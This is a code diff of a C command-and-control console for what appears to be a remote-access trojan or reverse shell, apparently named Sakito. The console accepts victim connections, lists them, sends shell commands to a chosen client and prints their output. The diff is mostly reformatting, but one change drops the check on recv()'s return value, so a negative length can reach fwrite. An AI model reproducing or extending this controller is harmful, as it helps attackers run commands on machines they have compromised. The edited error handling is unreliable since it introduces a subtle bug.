@@ -70,19 +70,19 @@ void bind_socket(const SOCKET listen_socket) {
 }
 
 void add_client(Conn_map* conns, char* const host, SOCKET client_socket) {
-	// If delete_client() is executing: wait for it to finish modifying conns->clients to prevent race conditions from occurring.
-	WaitForSingleObject(conns->ghMutex, INFINITE);
+		// If delete_client() is executing: wait for it to finish modifying conns->clients to prevent race conditions from occurring.
+		WaitForSingleObject(conns->ghMutex, INFINITE);
 
-	if (conns->size == conns->alloc)
-		conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));
+		if (conns->size == conns->alloc)
+			conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));
 
-	// Add hostname string and client_socket object to Conn structure.
-	conns->clients[conns->size].host = host;
-	conns->clients[conns->size].sock = client_socket;
-	conns->size++;
+		// Add hostname string and client_socket object to Conn structure.
+		conns->clients[conns->size].host = host;
+		conns->clients[conns->size].sock = client_socket;
+		conns->size++;
 
-	// Release our mutex now.
-	ReleaseMutex(conns->ghMutex);
+		// Release our mutex now.
+		ReleaseMutex(conns->ghMutex);
 }
 
 // Thread to recursively accept connections.
@@ -219,8 +219,7 @@ int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 
 	// Receive command output stream and write output chunks to stdout.
 	do {
-		if ((i_result = recv(client_socket, buf, BUFLEN, 0)) < 1)
-			return i_result;
+		i_result = recv(client_socket, buf, BUFLEN, 0);
 		if (detect_eos(i_result, buf))
 			break;
 		fwrite(buf, 1, i_result, stdout);
@@ -307,7 +306,7 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 
 	// If client disconnected/exit command is parsed: delete the connection.
 	delete_client(conns, client_id);
-	printf("Client: \"%s\" is no longer connected.\n\n", client_host);
+	printf("Client: \"%s\" disconnected.\n\n", client_host);
 }
 
 void terminate_console(HANDLE acp_thread, Conn_map conns) {
@@ -333,7 +332,7 @@ void validate_id(char* const buf, Conn_map conns) {
 		interact(&conns, buf, client_id);
 }
 
-void exec_cmd(char buf[]) {
+void exec_cmd(char* const buf) {
 	sakito_win_cp((SOCKET)NULL, buf);
 	fputc('\n', stdout);
 }
@@ -355,27 +354,23 @@ int main(void) {
 		char buf[BUFLEN + 1] = { 0 };
 		size_t cmd_len = get_line(buf);
 
-		if (cmd_len > 1) {
-			if (compare(buf, "exit")) {
+		if (cmd_len > 1)
+			if (compare(buf, "exit"))
+				// Terminate console application and server.
 				terminate_console(acp_thread, conns);
-			}
-			else if (compare(buf, "cd ")) {
+			else if (compare(buf, "cd "))
 				// Change directory on host system.
 				_chdir(buf+3);
-			}
-			else if (compare(buf, "list")) {
+			else if (compare(buf, "list"))
 				// List all connections.
 				list_connections(&conns);
-			}
-			else if (compare(buf, "interact ")) {
+			else if (compare(buf, "interact "))
 				// If ID is valid interact with client.
 				validate_id(buf, conns);
-			}
-			else {
+			else
 				// Execute command on host system.
 				exec_cmd(buf);
-			}
-		}
 	}
+
 	return -1;
 }
